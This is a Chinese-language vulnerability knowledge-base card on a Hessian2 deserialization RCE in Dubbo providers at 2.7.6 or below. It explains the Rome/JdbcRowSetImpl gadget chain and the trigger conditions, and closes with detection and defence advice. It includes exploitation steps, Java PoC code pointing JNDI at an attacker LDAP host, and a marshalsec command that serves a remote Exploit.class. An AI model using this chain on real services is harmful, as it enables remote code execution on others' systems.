---
id: web-java-deser-hessian-dubbo-provider-argument-deserialization-rce
title: Dubbo provider Hessian2 反序列化入口（<=2.7.6）：DecodeableRpcInvocation 解码 RPC 参数触发 HashMap→EqualsBean/ToStringBean→JdbcRowSetImpl JNDI RCE
type: scenario
domain: web
path: web/java/deserialization/hessian
technique: dubbo-provider-hessian2-argument-deserialization
tags:
- java
- dubbo
- hessian
- hessian2
- deserialization
- rpc
- jndi
- rome
- jdbcrowsetimpl
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
affected_versions: <=2.7.6（原文标题；演示版本 2.7.5）
verification:
  verified_by: verifier-V391
  verified_at: '2026-11-09T11:29:19+08:00'
  notes: 已对照原文与全部22张图片核对：DecodeHandler.received→DecodeableRpcInvocation.decode 读 dubboVersion/path/version/methodName/desc 后用 Hessian2ObjectInput.readObject 反序列化参数；tag 72→MapDeserializer.readMap→doReadMap→HashMap.put→EqualsBean.hashCode→ToStringBean.toString→JdbcRowSetImpl.getDatabaseMetaData→connect，与卡内链路及计算器截图一致；JavaDeserializer 全 null instantiate 导致 SignedObject NPE 的限制也与 img14-16 一致。affected_versions <=2.7.6（原文标题，演示 2.7.5）保留。PoC 按原文整理未复跑；无 CVE 字段（原文正文未给，截图注释提及 CVE-2020-1948）。
url: /docs/web/java/deserialization/hessian/web-java-deser-hessian-dubbo-provider-argument-deserialization-rce/
draft: false
kb_aliases:
- Dubbo Hessian 反序列化
- DecodeableRpcInvocation 反序列化
- Dubbo RPC 参数反序列化
- commonTest Object 参数
- Dubbo <=2.7.6 RCE
- Dubbo Hessian2 JNDI
---

## 一句话结论

Dubbo provider 处理 RPC 请求时会先读出 path/version/methodName/参数类型描述，再交给 `Hessian2ObjectInput.readObject` 反序列化调用参数；当服务方法的参数类型是 `Object` 时，攻击者可直接向 Dubbo 端口发送恶意 Hessian 流，用 `HashMap` 承载 Rome `EqualsBean/ToStringBean` 包住 `JdbcRowSetImpl` 的经典链，在 provider 端触发 `JdbcRowSetImpl.getDatabaseMetaData → JNDI lookup`，实现远程类加载 RCE（文章在 Dubbo 2.7.5 上实测弹出计算器）。

## 原理

- **Dubbo 请求解码入口**：provider 的 `DecodeHandler.received` 对 `Request` 调 `decode`，最终进入 `DecodeableRpcInvocation.decode(Channel, InputStream)`；该方法用 `CodecSupport.getSerialization(url, serializationType)` 取得 `Hessian2ObjectInput`，依次 `readUTF` 读出 dubboVersion、path、version、methodName、parameterTypesDesc，然后对参数调用 Hessian 的 `readObject`。整个过程中参数对象的类名与字段完全由请求流控制，没有类型白名单（补丁版本见另一张卡）。
- **Hessian2 反序列化触发点**：`Hessian2Input.readObject` 读到 map 标记（`H`，十进制 72）时走 `MapDeserializer.readMap` → `doReadMap`，逐对执行 `map.put(in.readObject(), in.readObject())`；`HashMap.put` 会先计算 key 的 `hashCode`，这就是 gadget 入口。
- **Rome + JdbcRowSetImpl 链**：`EqualsBean(ToStringBean.class, toStringBean)` 的 `hashCode` → `beanHashCode` → 内部 `ToStringBean.toString` 通过反射调用 `_obj` 上的 getter/toString；把 `ToStringBean._obj` 反射设为 `JdbcRowSetImpl` 且其 `dataSourceName` 为 `ldap://attacker/Exploit` 时，`getDatabaseMetaData` 会触发 `connect` 中的 JNDI `lookup`，由攻击者 LDAP/HTTP 服务返回并加载恶意类。
- **为什么必须是 Object 参数**：Hessian 按服务方法的参数类型决定反序列化的目标类型；参数为 `Object`/接口等宽类型时，流中的任意类都可能被实例化，gadget 才能落地。文章的 demo 在 provider 侧新增了 `commonTest(Object o)` 并让 consumer 调用它。
- **JDK 条件**：原文要求在 JDK 1.8.0_191 以下的版本测试（高版本默认禁止 LDAP 远程 codebase，需要换本地 classpath/JNDI 绕过方式，见 Hessian 目录其他链卡）。
- **二次反序列化限制**：文章尝试 SignedObject 二次反序列化链失败，原因是 Dubbo 使用的 Hessian `JavaDeserializer` 在反序列化对象时先用全 `null` 参数调用构造器（`instantiate()`），而 `SignedObject` 构造过程中会用 null 的 signingKey 调 `sign` 抛出 NPE；`ToStringBean` 这类允许 null 构造的类才能通过。该限制不影响本卡的 HashMap 链。

## 触发条件

- Dubbo provider 版本 <=2.7.6（文章演示 2.7.5），RPC 序列化方式为 hessian2（Dubbo 常用默认）。
- 攻击者能访问 Dubbo 协议端口（默认 20880，文章 demo 用 12345），并能构造 dubbo 协议请求或借 consumer 发送对象参数。
- 目标服务接口存在参数类型为 `Object`（或足够宽类型）的方法；泛化调用 `$invoke` 在未打补丁版本同样可走反序列化。
- provider classpath 含 Rome（`EqualsBean`/`ToStringBean`）与 JDK 自带 `com.sun.rowset.JdbcRowSetImpl`。
- provider 能出网到攻击者 LDAP/HTTP 服务，且 JDK 允许远程 codebase（原文要求 < 1.8.0_191）。

## 利用步骤

1. 探测/确认 Dubbo provider 端口、协议与服务接口；确定一个参数为 `Object` 的可调用方法（或 `$invoke` 泛化入口）。
2. 构造 gadget：`JdbcRowSetImpl` 设 `dataSourceName=ldap://<attacker>:1389/Exploit`；`ToStringBean(JdbcRowSetImpl.class, new ConstantTransformer(1))`；`EqualsBean(ToStringBean.class, toStringBean)`；放入 `HashMap` 作 key；再反射把 `toStringBean._obj` 设为 `JdbcRowSetImpl`。
3. 启动 `marshalsec.jndi.LDAPRefServer http://<attacker>:8000/#Exploit` 并在 8000 端口托管 `Exploit.class`（静态块执行 calc/命令）。
4. 通过 consumer 代码或手工 Dubbo 协议把该对象作为目标方法参数发送；在 provider 的 `JdbcRowSetImpl.connect:615` 下断可看到完整调用栈：`DecodeHandler.received → DecodeableRpcInvocation.decode → Hessian2ObjectInput.readObject → MapDeserializer.doReadMap → HashMap.put → EqualsBean.hashCode → ToStringBean.toString → JdbcRowSetImpl.getDatabaseMetaData → connect`。
5. `lookup` 触发远程类加载与初始化，provider 端执行代码。

## PoC

```java
// 构造恶意参数对象（示意，按文章链路重写）
JdbcRowSetImpl jdbcRowset = new JdbcRowSetImpl();
jdbcRowset.setDataSourceName("ldap://127.0.0.1:1389/Exploit");

ToStringBean toStringBean = new ToStringBean(JdbcRowSetImpl.class, new ConstantTransformer(1));
EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);

HashMap<Object, Object> map = new HashMap<>();
map.put(equalsBean, "123");
Field f = ToStringBean.class.getDeclaredField("_obj");
f.setAccessible(true);
f.set(toStringBean, jdbcRowset);
// 将该 map 作为 commonTest(Object) 的参数经 Dubbo RPC 发送给 provider
```

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8000/#Exploit
```

## 变体与关联

- 链可替换为 Hessian 目录中的其他 gadget：Groovy GString、JDK-only ProxyLazyValue、Spring/Rome/Resin/XBean JNDI、TreeMap+CustomProxy 等；入口都是 provider 对参数的 `readObject`。
- 入口替换：`HessianServlet` 在方法参数/Header 处触发、XXL-Job `/api`、Seata 8091 codec22 等，都是“Hessian 反序列化不可信请求体”的同类。
- Dubbo 补丁：2.7.6–2.7.8 增加 `isGenericCall`/`isEcho` 参数类型白名单；文章分析指出当服务方法参数类型非空时该白名单分支被跳过（见 [[web-java-deser-hessian-dubbo-pts-emptyclassarray-filter-bypass]]）。
- 关联卡片：[[web-java-deser-hessian-deserialization-entry-map-put]]（MapDeserializer 入口原理）、[[web-java-deser-hessian-jndi-outbound-chains]]（Rome 等出网 JNDI 链）、[[web-java-deser-hessian-signedobject-second-order-templates]]（SignedObject 二次反序列化；在 Dubbo 该入口下会因 null 构造失败）、[[web-java-deser-hessian-hessianservlet-argument-header-entry]]（另一 RPC 入口）。
- 边界：参数为具体类型（非 Object/宽类型）时 Hessian 按该类型反序列化，gadget 类不在期望类型链上会失败；高版本 JDK 阻断 LDAP 远程 codebase；Dubbo 开启序列化安全校验/白名单后该路径被拦。

## 检测与防御

- 升级 Dubbo 到修复版本；开启 `serialization.security.check` 与序列化白名单（`CodecSupport.checkSerialization`），不要仅依赖方法名过滤。
- 网络层限制 Dubbo 端口暴露范围，禁止 provider 任意出站 JNDI/LDAP/RMI/HTTP；JDK 升到 8u191+ 并保持 `com.sun.jndi.ldap.object.trustURLCodebase=false`。
- 检测：Hessian 流中出现 `com.rometools.rome.feed.impl.EqualsBean`/`ToStringBean`、`com.sun.rowset.JdbcRowSetImpl`、`javax.naming.InitialContext` 等类名；provider 端异常反连 LDAP 1389/HTTP；`DecodeableRpcInvocation` 解码失败与 JNDI 相关异常日志。
